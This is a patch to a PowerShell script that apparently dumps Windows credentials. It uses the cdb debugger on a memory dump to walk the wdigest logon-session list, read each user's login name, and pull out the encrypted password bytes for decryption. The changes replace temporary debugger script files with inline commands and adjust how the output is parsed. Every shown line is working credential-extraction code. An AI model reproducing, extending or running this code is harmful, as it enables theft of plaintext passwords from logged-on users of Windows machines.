@@ -1222,16 +1354,15 @@ else {
             $loopcount = $loopcount + 1
         }
 
-         Write-Progress -Activity "Getting first address of the list" -status "Running..." -id 1
-        [io.file]::WriteAllText($DebuggingScript,'dd wdigest!l_LogSessList') | Out-Null     
-        $wdigest = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"        
+        Write-Progress -Activity "Getting first address of the list" -status "Running..." -id 1          
+        $wdigest = &$CdbProgramPath -z $file -c "dd wdigest!l_LogSessList;Q"        
         $firstAddress = ""
         $arrayFirstAddress = ($wdigest -split ' ')    
-        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
+        $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 4
         $firstAddress1 = $arrayFirstAddress[$foundInstruction]
-        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
+        $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 5
         $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
-        $firstAddress = "$firstAddress2$firstAddress1" 
+        $firstAddress = "$firstAddress2$firstAddress1"         
         <#________________________________________________________________________
 
         We find the first address of the list and loop until we reach it again
@@ -1241,29 +1372,29 @@ else {
         $i = 0
         while ($firstAddressList -ne $nextEntry) {
             if($i -eq 0) {
-                $nextEntry = $firstAddress
-                [io.file]::WriteAllText($DebuggingScript,"dd $firstAddress") | Out-Null    
+                $nextEntry = $firstAddress                
+                $command = "dd $firstAddress"  
             }
-            else {
-                [io.file]::WriteAllText($DebuggingScript,"dd $nextEntry") | Out-Null    
+            else {                 
+                $command = "dd $nextEntry"    
             }
-            $ddSecond = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
+            $ddSecond = &$CdbProgramPath -z $file -c "$command;Q" 
             # Next entry in the list
             if($i -eq 0) {
                 $firstAddress = $firstAddress               
                 $arrayNextEntryAddress = ($ddSecond -split ' ')    
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 4
                 $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 5
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 5
                 $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                 $nextEntry = "$nextEntry2$nextEntry1"                   
             }
             else {        
                 $firstAddress = $nextEntry
                 $arrayNextEntryAddress = ($ddSecond -split ' ')    
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 4
                 $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 5
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 5
                 $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                 $nextEntry = "$nextEntry2$nextEntry1"                
             }    
@@ -1272,42 +1403,40 @@ else {
             Write-Progress -Activity "Getting logging information" -status "Running..." -id 1        
             $arrayLoginAddress = ($ddSecond -split ' ')           
             $start = 28                     
-            $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start
+            $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start
             $loginAddress1 = $arrayLoginAddress[$foundInstruction]             
             $loginAddress = "$loginAddress1"                            
-        
+
             if($loginAddress -eq "00000000"){
                 $start = 16                     
-                $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start
+                $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start
                 $loginAddress1 = $arrayLoginAddress[$foundInstruction]             
-                $loginAddress = "$loginAddress1"                                    
-                [io.file]::WriteAllText($DebuggingScript,"du $loginAddress") | Out-Null   
-                $loginDB = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"   
+                $loginAddress = "$loginAddress1"                                                    
+                $loginDB = &$CdbProgramPath -z $file -c "du $loginAddress;Q"   
                 $arrayloginDBAddress = ($loginDB -split ' ')            
-                $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
+                $foundInstruction = [array]::indexof($arrayloginDBAddress,"'du") + 4
                 $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
                 $loginPlainText = $loginPlainText1
             }
-            else {
-                [io.file]::WriteAllText($DebuggingScript,"du $loginAddress") | Out-Null   
-                $loginDB = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"   
+            else {                
+                $loginDB = &$CdbProgramPath -z $file -c "du $loginAddress;Q"   
                 $arrayloginDBAddress = ($loginDB -split ' ')            
-                $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
+                $foundInstruction = [array]::indexof($arrayloginDBAddress,"'du") + 4
                 $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
                 $loginPlainText = $loginPlainText1
-            }            
+            }     
+
             # Password
             Write-Progress -Activity "Getting password information" -status "Running..." -id 1         
             $arrayPasswordAddress = ($ddSecond -split ' ')                            
-            $foundInstruction = [array]::indexof($arrayPasswordAddress,"dd") + 19
+            $foundInstruction = [array]::indexof($arrayPasswordAddress,"'dd") + 19
             $lengthPassword = $arrayPasswordAddress[$foundInstruction]
             $lengthPassword = $lengthPassword.Substring(6,2)        
             $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lengthPassword,16)/8) * 4                
-            $foundInstruction = [array]::indexof($arrayPasswordAddress,"dd") + 22
+            $foundInstruction = [array]::indexof($arrayPasswordAddress,"'dd") + 22
             $secondAddress1 = $arrayPasswordAddress[$foundInstruction]                
-            $secondAddress = "$secondAddress1"                                          
-            [io.file]::WriteAllText($DebuggingScript,"dw $secondAddress") | Out-Null   
-            $passAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"                          
+            $secondAddress = "$secondAddress1"                                                      
+            $passAddress = &$CdbProgramPath -z $file -c "dw $secondAddress;Q"                          
             $arrayPasAddress = ($passAddress -split ' ')                  
             $passAddress1 = ""
             $passAddress2 = ""
@@ -1332,7 +1461,7 @@ else {
                         $comma = ", "
                     }
                 }
-                $foundInstruction = [array]::indexof($arrayPasAddress,"dw") + $value                
+                $foundInstruction = [array]::indexof($arrayPasAddress,"'dw") + $value                
                 $passAddress2 = $arrayPasAddress[$foundInstruction].Substring(0,2)
                 $passAddress1 = $arrayPasAddress[$foundInstruction].Substring(2,2)            
                 $stringPasswordHex += "$passAddress1$passAddress2"
@@ -1342,10 +1471,7 @@ else {
 
             $passwordHex = $stringPasswordHex                            
             Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText"                        
-            $cipherToDecrypt = $passwordHex
-            #$env:PATHEXT += ";.py"
-            #http://blog.digital-forensics.it/2015/05/undesxing.html                        
-            #$password = &$pythonProgramPath $cipherToDecrypt $g_Feedback $DESXKeyHex                        
+            $cipherToDecrypt = $passwordHex                      
             $hexarray = $cipherToDecrypt -split '(.{2})' | ? {$_}
             if($hexarray){
                 $hexcount = $hexarray.count
